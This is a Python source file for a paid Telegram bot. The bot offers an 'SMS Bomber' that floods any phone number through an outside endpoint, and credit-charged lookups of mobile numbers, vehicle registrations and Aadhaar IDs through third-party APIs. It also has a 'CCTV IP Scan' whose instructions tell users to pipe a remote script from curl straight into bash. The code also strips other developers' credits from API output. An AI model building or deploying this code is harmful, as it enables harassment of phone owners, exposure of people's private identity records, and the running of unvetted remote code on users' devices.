import os
import re
import sqlite3
import asyncio
from datetime import datetime, timezone
from pathlib import Path
import aiohttp
from urllib.parse import urlparse, parse_qs
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, ContextTypes, filters

TOKEN = os.environ['BOT_TOKEN']
ADMIN_ID = int(os.environ['ADMIN_ID'])

RENDER_EXTERNAL_URL = os.getenv('RENDER_EXTERNAL_URL')
PORT = int(os.getenv('PORT', 10000))
WEBHOOK_PATH = f"/webhook/{TOKEN}"
DB_PATH = os.getenv('DB_PATH', 'bot.db')

DEVELOPER_NAME = "DEVELOPED BY SUMIT KUMAR"
SUPPORT_LINK = "https://t.me/GNESUPPORT"
FREE_CREDITS = 10
LOOKUP_COST = 1

def strip_html(html):
    html = re.sub(r'<script.*?</script>', '', html, flags=re.DOTALL | re.IGNORECASE)
    html = re.sub(r'<style.*?</style>', '', html, flags=re.DOTALL | re.IGNORECASE)
    html = re.sub(r'<[^>]+>', '', html)
    return html.strip()

def db_conn():
    c = sqlite3.connect(DB_PATH)
    c.row_factory = sqlite3.Row
    return c

def db_init():
    c = db_conn()
    cur = c.cursor()
    cur.executescript('''
    CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT, last_name TEXT, language_code TEXT, is_premium INTEGER DEFAULT 0, credits INTEGER DEFAULT 0, first_seen TEXT NOT NULL, last_seen TEXT NOT NULL, msg_count INTEGER DEFAULT 0);
    CREATE TABLE IF NOT EXISTS credit_history (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER NOT NULL, amount INTEGER NOT NULL, reason TEXT, added_by INTEGER, created_at TEXT NOT NULL);
    ''')
    c.commit(); cur.close(); c.close()

def now_iso(): return datetime.now(timezone.utc).isoformat()

def register_user(u):
    c = db_conn(); cur = c.cursor()
    cur.execute('SELECT user_id FROM users WHERE user_id=?', (u.id,))
    exists = cur.fetchone()
    if exists:
        cur.execute('UPDATE users SET username=?, first_name=?, last_name=?, language_code=?, is_premium=?, last_seen=?, msg_count=msg_count+1 WHERE user_id=?', (u.username or '', u.first_name or '', u.last_name or '', u.language_code or '', 1 if getattr(u, 'is_premium', False) else 0, now_iso(), u.id))
        is_new = False
    else:
        cur.execute('INSERT INTO users(user_id, username, first_name, last_name, language_code, is_premium, credits, first_seen, last_seen, msg_count) VALUES(?,?,?,?,?,?,?,?,?,1)', (u.id, u.username or '', u.first_name or '', u.last_name or '', u.language_code or '', 1 if getattr(u, 'is_premium', False) else 0, FREE_CREDITS, now_iso(), now_iso()))
        cur.execute('INSERT INTO credit_history(user_id, amount, reason, added_by, created_at) VALUES(?,?,?,?,?)', (u.id, FREE_CREDITS, 'Welcome bonus', 0, now_iso()))
        is_new = True
    c.commit(); cur.close(); c.close()
    return is_new

def get_user(uid):
    c = db_conn(); cur = c.cursor(); cur.execute('SELECT * FROM users WHERE user_id=?', (uid,)); r = cur.fetchone(); cur.close(); c.close(); return r

def get_credits(uid):
    c = db_conn(); cur = c.cursor(); cur.execute('SELECT credits FROM users WHERE user_id=?', (uid,)); r = cur.fetchone(); cur.close(); c.close(); return r['credits'] if r else 0

def add_credits(uid, amount, reason, added_by=0):
    c = db_conn(); cur = c.cursor(); cur.execute('UPDATE users SET credits=credits+? WHERE user_id=?', (amount, uid)); cur.execute('INSERT INTO credit_history(user_id, amount, reason, added_by, created_at) VALUES(?,?,?,?,?)', (uid, amount, reason, added_by, now_iso())); c.commit(); cur.close(); c.close()

def deduct_credits(uid, amount, reason):
    c = db_conn(); cur = c.cursor(); cur.execute('UPDATE users SET credits=credits-? WHERE user_id=?', (amount, uid)); cur.execute('INSERT INTO credit_history(user_id, amount, reason, added_by, created_at) VALUES(?,?,?,?,?)', (uid, -amount, reason, 0, now_iso())); c.commit(); cur.close(); c.close()

def all_users(limit=50):
    c = db_conn(); cur = c.cursor(); cur.execute('SELECT * FROM users ORDER BY first_seen DESC LIMIT ?', (limit,)); rows = cur.fetchall(); cur.close(); c.close(); return rows

def user_count():
    c = db_conn(); cur = c.cursor(); cur.execute('SELECT COUNT(*) AS n FROM users'); r = cur.fetchone(); cur.close(); c.close(); return r['n'] if r else 0

def find_user_by_username_or_id(query):
    c = db_conn(); cur = c.cursor()
    try:
        uid = int(query.strip()); cur.execute('SELECT * FROM users WHERE user_id=?', (uid,)); r = cur.fetchone()
        if r: cur.close(); c.close(); return r
    except ValueError: pass
    uname = query.strip().lstrip('@').lower(); cur.execute("SELECT * FROM users WHERE LOWER(username)=?", (uname,)); r = cur.fetchone(); cur.close(); c.close(); return r

def kb(uid):
    x = [[InlineKeyboardButton('🔍 Lookup Services', callback_data='lookup_menu')],[InlineKeyboardButton('💥 SMS Bomber', callback_data='bomber')],[InlineKeyboardButton('💰 Wallet', callback_data='wallet')],[InlineKeyboardButton('📊 Status', callback_data='status')]]
    if uid == ADMIN_ID: x.append([InlineKeyboardButton('👑 Admin Panel', callback_data='admin')])
    return InlineKeyboardMarkup(x)

def admin_kb():
    return InlineKeyboardMarkup([[InlineKeyboardButton('👥 All Users', callback_data='users')],[InlineKeyboardButton('➕ Add Credits', callback_data='addcredits')],[InlineKeyboardButton('📊 User Stats', callback_data='stats')]])

def lookup_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton('📱 Number Lookup (1 Credit)', callback_data='lookup_num')],
        [InlineKeyboardButton('🚗 Vahan Lookup (1 Credit)', callback_data='lookup_vahan')],
        [InlineKeyboardButton('🏦 IFSC Lookup (1 Credit)', callback_data='lookup_ifsc')],
        [InlineKeyboardButton('🆔 Aadhaar Lookup (1 Credit)', callback_data='lookup_aadhaar')],
        [InlineKeyboardButton('📡 CCTV IP Scan', callback_data='lookup_cctv')], # NAYA NAAM
        [InlineKeyboardButton('⬅️ Back', callback_data='home')]
    ])

def wallet_kb():
    return InlineKeyboardMarkup([[InlineKeyboardButton('💳 Buy More Credits', url=SUPPORT_LINK)],[InlineKeyboardButton('📜 History', callback_data='credithistory')],[InlineKeyboardButton('⬅️ Back', callback_data='home')]])

def clean_response(text):
    lines = text.split('\n'); clean_lines = []
    skip_keywords = ['developer', 'priyanshu', 'gupta', 'channel', 't.me', 'priyanshuexploits', '@priyanshu', '👨‍💻', '📢', '❤️']
    for line in lines:
        low = line.lower().strip()
        if any(kw in low for kw in skip_keywords): continue
        clean_lines.append(line)
    text = '\n'.join(clean_lines).strip()
    while '\n\n\n' in text: text = text.replace('\n\n\n', '\n\n')
    return text

def add_watermark(text): return text + f"\n\n━━━━━━━━━━━━━━━━━━━━\n👨‍💻 {DEVELOPER_NAME}\n━━━━━━━━━━━━━━━━━━━━"

async def home(update, context):
    u = update.effective_user
    is_new = register_user(u)
    if is_new:
        try: await context.bot.send_message(ADMIN_ID, f"🆕 NEW USER\n\n👤 Name: {u.first_name or ''} {u.last_name or ''}\n📛 Username: @{u.username}\n🆔 User ID: {u.id}")
        except Exception: pass
    r = get_user(u.id); credits = r['credits'] if r else 0
    text = f"👋 Hi {u.first_name or 'User'}!\n\n💰 Wallet Balance: {credits} Credits\n\nUse the buttons below.\n\n━━━━━━━━━━━━━━━━━━━━\n👨‍💻 {DEVELOPER_NAME}\n━━━━━━━━━━━━━━━━━━━━"
    if update.callback_query: await update.callback_query.edit_message_text(text, reply_markup=kb(u.id))
    else: await update.message.reply_text(text, reply_markup=kb(u.id))

async def start(update, context): await home(update, context)
async def status(update, context): await home(update, context)

async def wallet_menu(update, context):
    q = update.callback_query; await q.answer()
    credits = get_credits(q.from_user.id)
    text = f"💰 WALLET\n\n👤 {q.from_user.first_name or 'User'}\n💳 Credits: {credits}\n\n• 1 Credit = 1 Lookup\n• Naya users ko {FREE_CREDITS} credits free\n\n━━━━━━━━━━━━━━━━━━━━\n👨‍💻 {DEVELOPER_NAME}\n━━━━━━━━━━━━━━━━━━━━"
    await q.edit_message_text(text, reply_markup=wallet_kb())

async def credit_history(update, context):
    q = update.callback_query; await q.answer()
    c = db_conn(); cur = c.cursor(); cur.execute('SELECT * FROM credit_history WHERE user_id=? ORDER BY id DESC LIMIT 20', (q.from_user.id,)); rows = cur.fetchall(); cur.close(); c.close()
    if not rows: await q.edit_message_text('📜 No history.', reply_markup=wallet_kb()); return
    text = '📜 Credit History (Last 20)\n\n'
    for r in rows: text += f"{'+' if r['amount']>=0 else ''}{r['amount']} • {r['reason']}\n   {r['created_at'][:19]}\n\n"
    await q.edit_message_text(text[:4000] + f"\n━━━━━━━━━━━━━━━━━━━━\n👨‍💻 {DEVELOPER_NAME}\n━━━━━━━━━━━━━━━━━━━━", reply_markup=wallet_kb())

async def lookup_menu(update, context):
    q = update.callback_query; await q.answer()
    await q.edit_message_text('🔍 Lookup Services\n\nChoose a service:\n\nEach lookup costs 1 credit.', reply_markup=lookup_kb())

async def check_credits_or_warn(q, user_id):
    credits = get_credits(user_id)
    if credits <= 0:
        await q.edit_message_text(f'❌ Insufficient Credits\n\nYour balance: {credits} credits\n\nTap "Buy More Credits" to top up.', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('💳 Buy More Credits', url=SUPPORT_LINK)],[InlineKeyboardButton('⬅️ Back', callback_data='home')]]))
        return False
    return True

async def lookup_num_start(update, context):
    q = update.callback_query; await q.answer()
    if not await check_credits_or_warn(q, q.from_user.id): return
    context.user_data['lookup_type'] = 'num'
    await q.edit_message_text(f'📱 Number Lookup\n\nSend the mobile number (10 digits):\n\n💰 Cost: 1 Credit', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('⬅️ Back', callback_data='lookup_menu')]]))

async def lookup_vahan_start(update, context):
    q = update.callback_query; await q.answer()
    if not await check_credits_or_warn(q, q.from_user.id): return
    context.user_data['lookup_type'] = 'vahan'
    await q.edit_message_text(f'🚗 Vahan Lookup\n\nSend the vehicle RC number:\n\n💰 Cost: 1 Credit', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('⬅️ Back', callback_data='lookup_menu')]]))

async def lookup_ifsc_start(update, context):
    q = update.callback_query; await q.answer()
    if not await check_credits_or_warn(q, q.from_user.id): return
    context.user_data['lookup_type'] = 'ifsc'
    await q.edit_message_text(f'🏦 IFSC Lookup\n\nSend the IFSC code:\n\n💰 Cost: 1 Credit', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('⬅️ Back', callback_data='lookup_menu')]]))

async def lookup_aadhaar_start(update, context):
    q = update.callback_query; await q.answer()
    if not await check_credits_or_warn(q, q.from_user.id): return
    context.user_data['lookup_type'] = 'aadhaar'
    await q.edit_message_text(f'🆔 Aadhaar Lookup\n\nSend the 12-digit Aadhaar number:\n\n💰 Cost: 1 Credit', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('⬅️ Back', callback_data='lookup_menu')]]))

# ==================== NAYA CCTV FLOW ====================
async def lookup_cctv_start(update, context):
    q = update.callback_query; await q.answer()
    if not await check_credits_or_warn(q, q.from_user.id): return
    
    context.user_data['lookup_type'] = 'cctv_url'
    text = (
        f"📡 <b>CCTV IP Scan</b>\n\n"
        f"Apne network ko scan karne ke liye Termux me ye command run karein:\n"
        f"<code>bash -c \"$(curl -sL https://github.com/Sumitkr829452/CCTV-SCANNER/raw/main/setup.sh)\"</code>\n\n"
        f"Jab Termux me URL aayega (jaise <code>https://xyz.lhr.life</code>), toh wo URL yahan bhejein.\n"
        f"💰 Cost: 1 Credit"
    )
    await q.edit_message_text(text, parse_mode='HTML', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('⬅️ Back', callback_data='lookup_menu')]]))

async def bomber_start(update, context):
    q = update.callback_query; await q.answer()
    context.user_data['bomber'] = True
    await q.edit_message_text('💥 SMS Bomber\n\nSend the 10-digit mobile number:', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('⬅️ Back', callback_data='home')]]))

async def addcredits_process(update, context, text):
    step = context.user_data.get('addcredits_step')
    if step == 'user':
        u = find_user_by_username_or_id(text)
        if not u: await update.message.reply_text('❌ User not found.'); return
        context.user_data['addcredits_user'] = u['user_id']; context.user_data['addcredits_step'] = 'amount'
        await update.message.reply_text(f"✅ User found: {u['first_name']} (@{u['username']})\n\nSend amount of credits:")
        return
    if step == 'amount':
        try:
            amount = int(text.strip())
            if amount <= 0 or amount > 100000: raise ValueError()
        except ValueError: await update.message.reply_text('❌ Invalid amount.'); return
        uid = context.user_data['addcredits_user']
        add_credits(uid, amount, 'Added by admin', added_by=ADMIN_ID)
        u = get_user(uid)
        await update.message.reply_text(f"✅ {amount} Credits added to {u['first_name']}.", reply_markup=admin_kb())
        try: await context.bot.send_message(uid, f"💰 {amount} credits added!", reply_markup=kb(uid))
        except Exception: pass
        context.user_data['addcredits_step'] = None
        return

async def text_msg(update, context):
    register_user(update.effective_user)
    uid = update.effective_user.id
    v = update.message.text.strip()

    if uid == ADMIN_ID and context.user_data.get('addcredits_step'):
        await addcredits_process(update, context, v); return

    if context.user_data.get('bomber'):
        context.user_data['bomber'] = False
        if not v.isdigit() or len(v) != 10: await update.message.reply_text('❌ Invalid number.'); return
        processing = await update.message.reply_text('💥 Bombing started...')
        try:
            timeout = aiohttp.ClientTimeout(total=30)
            async with aiohttp.ClientSession(timeout=timeout) as s:
                async with s.get(f'https://rohithost.myvipsite.fun/Bomber/?number={v}') as r: await r.text()
        except Exception: pass
        await processing.edit_text(f'✅ Bombing started on {v}.', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('⬅️ Back', callback_data='home')]]))
        return

    lookup_type = context.user_data.get('lookup_type')
    if lookup_type:
        context.user_data['lookup_type'] = None
        
        if get_credits(uid) <= 0:
            await update.message.reply_text('❌ Insufficient Credits.', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('💳 Buy', url=SUPPORT_LINK)]])); return

        # FLOW: User sends URL
        if lookup_type == 'cctv_url':
            base_url = v
            if not base_url.startswith('http'): base_url = 'https://' + base_url
            context.user_data['cctv_url'] = base_url
            
            # Bot asks Private or Public
            kb_opts = InlineKeyboardMarkup([
                [InlineKeyboardButton('🏠 Private IP (Local Network)', callback_data='scan_priv')],
                [InlineKeyboardButton('🌐 Public IP (Internet)', callback_data='scan_pub')]
            ])
            await update.message.reply_text(f"✅ URL Received: <code>{base_url}</code>\n\nAb batayein, aap kya scan karna chahte hain?", parse_mode='HTML', reply_markup=kb_opts)
            return

        urls = {
            'num': f'https://thanksfor100user.vercel.app/num?number={v}',
            'vahan': f'https://priyanshu-pied-xi.vercel.app/api/vahan?rc={v}&format=card',
            'ifsc': f'https://priyanshuexploits.vercel.app/api/ifsc/{v}?format=text',
            'aadhaar': f'https://aadhar-xi.vercel.app/api/lookup?id={v}&format=card'
        }
        try:
            timeout = aiohttp.ClientTimeout(total=25)
            async with aiohttp.ClientSession(timeout=timeout) as s:
                async with s.get(urls[lookup_type]) as r:
                    text = add_watermark(clean_response(await r.text()))
                    deduct_credits(uid, LOOKUP_COST, f'Lookup: {lookup_type}')
                    await update.message.reply_text(text[:4000] + f"\n💳 Credits: {get_credits(uid)}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('⬅️ Back', callback_data='home')]]))
        except Exception as e: await update.message.reply_text(f'❌ Error: {e}')
        return

    await update.message.reply_text('👇 Use the buttons below:', reply_markup=kb(uid))

async def admin(update, context):
    q = update.callback_query; await q.answer()
    if q.from_user.id != ADMIN_ID: return
    await q.edit_message_text(f'👑 Admin Panel\n\nTotal Users: {user_count()}', reply_markup=admin_kb())

async def users_list(update, context):
    q = update.callback_query; await q.answer()
    if q.from_user.id != ADMIN_ID: return
    rows = all_users(50)
    if not rows: await q.edit_message_text('👥 No users.', reply_markup=admin_kb()); return
    await q.edit_message_text(f'👥 Last 50 Users (Total: {user_count()})', reply_markup=admin_kb())
    for r in rows:
        try: await context.bot.send_message(ADMIN_ID, f"👤 {r['first_name']} (@{r['username']})\n🆔 {r['user_id']}\n💰 {r['credits']}")
        except Exception: pass

async def stats(update, context):
    q = update.callback_query; await q.answer()
    if q.from_user.id != ADMIN_ID: return
    c = db_conn(); cur = c.cursor(); cur.execute('SELECT SUM(credits) AS total FROM users'); total_credits = cur.fetchone()['total'] or 0; cur.close(); c.close()
    await q.edit_message_text(f'📊 Stats\n\n👥 Users: {user_count()}\n💰 Credits: {total_credits}', reply_markup=admin_kb())

async def addcredits_start(update, context):
    q = update.callback_query; await q.answer()
    if q.from_user.id != ADMIN_ID: return
    context.user_data['addcredits_step'] = 'user'
    await q.edit_message_text('➕ Add Credits\n\nSend User ID or @username:', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('❌ Cancel', callback_data='admin')]]))

# ==================== SCAN LOGIC BUTTONS ====================
async def handle_scan_btns(update, context):
    q = update.callback_query; await q.answer()
    base_url = context.user_data.get('cctv_url')
    if not base_url:
        await q.edit_message_text("❌ Session expire. Kripya naya URL dalein."); return
        
    action = q.data
    if action == 'scan_priv':
        await q.edit_message_text('🏠 Scanning Private IPs (Local Network)... Please wait (30-40s).')
        try:
            timeout = aiohttp.ClientTimeout(total=60)
            async with aiohttp.ClientSession(timeout=timeout) as s:
                async with s.get(f"{base_url}/auto_scan") as r:
                    data = await r.json()
                    if data.get('status') == 'success':
                        devs = data.get('devices', [])
                        txt = f"✅ <b>Private Network ({data.get('network_scanned')})</b>\n\n"
                        if not devs: txt += "❌ Koi active device nahi mila."
                        for d in devs: txt += f"📡 IP: <code>{d['ip']}</code> | Ports: {', '.join(map(str, d['open_ports']))}\n"
                        deduct_credits(q.from_user.id, LOOKUP_COST, 'CCTV Private')
                        await q.edit_message_text(txt + f"\n💳 Credits: {get_credits(q.from_user.id)}", parse_mode='HTML', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('⬅️ Back', callback_data='home')]]))
        except Exception as e: await q.edit_message_text(f"❌ Error: {e}")

    elif action == 'scan_pub':
        await q.edit_message_text('🌐 Detecting Public IP and scanning ports... Please wait (10-20s).')
        try:
            timeout = aiohttp.ClientTimeout(total=60)
            async with aiohttp.ClientSession(timeout=timeout) as s:
                async with s.get("https://api.ipify.org?format=json") as ip_res:
                    my_ip = (await ip_res.json()).get('ip')
                async with s.get(f"{base_url}/scan_public?ip={my_ip}") as r:
                    data = await r.json()
                    if data.get('status') == 'success':
                        devs = data.get('devices', [])
                        txt = f"✅ <b>Public Network ({my_ip})</b>\n\n"
                        if devs and devs[0]['open_ports']: txt += f"🔓 Open Ports: {', '.join(map(str, devs[0]['open_ports']))}\n"
                        else: txt += "❌ Koi open port nahi mila.\n"
                        deduct_credits(q.from_user.id, LOOKUP_COST, 'CCTV Public')
                        await q.edit_message_text(txt + f"\n💳 Credits: {get_credits(q.from_user.id)}", parse_mode='HTML', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('⬅️ Back', callback_data='home')]]))
        except Exception as e: await q.edit_message_text(f"❌ Error: {e}")

async def callbacks(update, context):
    d = update.callback_query.data
    if d == 'home': await home(update, context)
    elif d == 'status': await home(update, context)
    elif d == 'wallet': await wallet_menu(update, context)
    elif d == 'credithistory': await credit_history(update, context)
    elif d == 'admin': await admin(update, context)
    elif d == 'users': await users_list(update, context)
    elif d == 'stats': await stats(update, context)
    elif d == 'addcredits': await addcredits_start(update, context)
    elif d == 'lookup_menu': await lookup_menu(update, context)
    elif d == 'lookup_num': await lookup_num_start(update, context)
    elif d == 'lookup_vahan': await lookup_vahan_start(update, context)
    elif d == 'lookup_ifsc': await lookup_ifsc_start(update, context)
    elif d == 'lookup_aadhaar': await lookup_aadhaar_start(update, context)
    elif d == 'lookup_cctv': await lookup_cctv_start(update, context)
    elif d == 'bomber': await bomber_start(update, context)
    elif d in ['scan_priv', 'scan_pub']: await handle_scan_btns(update, context)

from http.server import BaseHTTPRequestHandler, HTTPServer
class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200); self.send_header('Content-Type', 'text/plain'); self.end_headers(); self.wfile.write(b'OK')
    def log_message(self, format, *args): pass

def main():
    db_init()
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler('start', start))
    app.add_handler(CallbackQueryHandler(callbacks))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_msg))
    if RENDER_EXTERNAL_URL:
        app.run_webhook(listen='0.0.0.0', port=PORT, url_path=WEBHOOK_PATH, webhook_url=f'{RENDER_EXTERNAL_URL}{WEBHOOK_PATH}', drop_pending_updates=True)
    else:
        app.run_polling()

if __name__ == '__main__': main()
